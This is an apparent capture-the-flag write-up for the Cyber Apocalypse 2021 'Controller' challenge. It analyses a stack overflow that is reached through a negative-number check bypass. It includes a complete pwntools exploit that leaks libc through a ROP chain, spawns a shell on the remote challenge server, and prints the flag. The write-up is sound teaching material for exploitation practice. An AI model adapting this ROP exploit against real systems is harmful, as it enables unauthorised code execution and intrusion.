# Cyber Apocalypse 2021

## Controller

> The extraterrestrials have a special controller in order to manage and use our resources wisely, in order to produce state of the art technology gadgets and weapons for them. If we gain access to the controller's server, we can make them drain the minimum amount of resources or even stop them completeley. Take action fast!
> 
> This challenge will raise 33 euros for a good cause.
>
> [`pwn_controller.zip`](`pwn_controller.zip`)

Tags: _pwn_ _x86-64_ _integer-overflow_ _rop_ _bof_ _scanf_


## Summary

Integer overflow to a textbook two-pass (leak/pwn) BOF/ROPchain.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Full RELRO, no got-overwrite.  No canary and no PIE, easy BOF, easy ROP.


### Decompile with Ghidra

```c
void calculator(void)
{
  char local_28 [28];
  uint local_c;
  
  local_c = calc();
  if (local_c == 0xff3a) {
    printstr("Something odd happened!\nDo you want to report the problem?\n> ");
    __isoc99_scanf(&%s,local_28);
    if ((local_28[0] == 'y') || (local_28[0] == 'Y')) {
      printstr("Problem reported!\n");
    }
    else {
      printstr("Problem ingored\n");
    }
  }
  else {
    calculator();
  }
  return;
}
```

`scanf("%s",local_28)` is basically `gets` since the `%s` is unbounded.  If we can get `calc()` to return `0xff3a` (65338), then we can use a classic ROPchain to leak libc and get a shell.

```c
uint calc(void)
{
  float fVar1;
  uint local_18;
  uint local_14;
  int local_10;
  uint local_c;
  
  printstr("Insert the amount of 2 different types of recources: ");
  __isoc99_scanf("%d %d",&local_14,&local_18);
  local_10 = menu();
  if ((0x45 < (int)local_14) || (0x45 < (int)local_18)) {
    printstr("We cannot use these many resources at once!\n");
    exit(0x69);
  }
  if (local_10 == 2) {
    local_c = sub(local_14,local_18);
    printf("%d - %d = %d\n",(ulong)local_14,(ulong)local_18,(ulong)local_c);
    return local_c;
  }
  if (local_10 < 3) {
    if (local_10 == 1) {
      local_c = add(local_14,local_18);
      printf("%d + %d = %d\n",(ulong)local_14,(ulong)local_18,(ulong)local_c);
      return local_c;
    }
  }
  else {
    if (local_10 == 3) {
      local_c = mult(local_14,local_18);
      local_c = local_c & 0xffff;
      printf("%d * %d = %d\n",(ulong)local_14,(ulong)local_18,(ulong)local_c);
      return local_c;
    }
    if (local_10 == 4) {
      fVar1 = divi(local_14,local_18);
      local_c = (uint)(long)fVar1;
      printf("%d / %d = %d\n",(ulong)local_14,(ulong)local_18,(long)fVar1 & 0xffffffff);
      return local_c;
    }
  }
  printstr("Invalid operation, exiting..\n");
  return local_c;
}
```

Returning `0xff3a` (65338) out of `calc` is trivial since `((0x45 < (int)local_14) || (0x45 < (int)local_18))` will allow negative numbers--integer overflow.

`0 - -65338` = `65338`; our key to admission.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./controller')

if args.REMOTE:
    p = remote('188.166.172.13',30995)
    libc = ELF('./libc.so.6')
else:
    p = process(binary.path)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p.sendlineafter('recources: ','0 -65338')
p.sendlineafter('> ','2')

pop_rdi = next(binary.search(asm('pop rdi; ret')))

payload  = 0x28 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.calculator)

p.sendlineafter('> ',payload)

p.recvuntil('ingored\n')
_ = p.recv(6)
puts = u64(_ + b'\0\0')
log.info('puts: ' + hex(puts))
libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))

p.sendlineafter('recources: ','0 -65338')
p.sendlineafter('> ','2')

payload  = b''
payload += 0x28 * b'A'
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(libc.search(b"/bin/sh").__next__())
payload += p64(libc.sym.system)

p.sendlineafter('> ',payload)
p.recvuntil('ingored\n')
p.interactive()
```

Basic two pass ROPchain.  Both passes start with `0x28` (`local_28`, see Ghidra stack diagram) bytes of garbage.

First, leak libc with `puts`, and then loop around for a second pass.

With the libc location known, and libc provided, pop a shell.

Output:

```
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/cyberapocalypsectf2021/controller/controller'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 188.166.172.13 on port 30995: Done
[*] '/pwd/datajerk/cyberapocalypsectf2021/controller/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] puts: 0x7fb46fa22aa0
[*] libc.address: 0x7fb46f9a2000
[*] Switching to interactive mode
$ cat flag.txt
CHTB{1nt3g3r_0v3rfl0w_s4v3d_0ur_r3s0urc3s}
```
